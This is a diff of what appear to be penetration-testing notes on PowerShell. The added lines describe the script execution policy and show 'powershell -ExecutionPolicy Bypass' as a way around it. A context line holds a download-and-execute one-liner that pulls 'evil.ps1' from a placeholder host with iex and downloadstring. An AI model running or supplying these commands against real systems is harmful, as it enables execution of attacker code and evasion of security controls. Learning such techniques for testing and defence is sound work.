@@ -16,13 +16,19 @@ iex (new-object net.webclient).downloadstring('http://192.168.0.1/evil.ps1')
 
 ## Execution Policy
 
-We can query the execution policy of the current powershell context by running:
+The powershelll Execution Policy controls what scripts the local user can run.  We can query the execution policy of the current powershell context by running:
 
 ```text
 get-executionpolicy
 ```
 
-So for security reasons the default policy for executing scripts is **Restricted**. Here are the different script-policies.
+In fact there are a [whole host of methods](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/) we can use to bypass this policy.  One rather trivial method is to launch a powershell command with the execution policy unrestricted:
+
+```text
+powershell -ExecutionPolicy Bypass
+```
+
+For security reasons the default policy for executing scripts is **Restricted**. Here are the different script-policies.
 
 **Restricted**: PowerShell won't run any scripts.
 
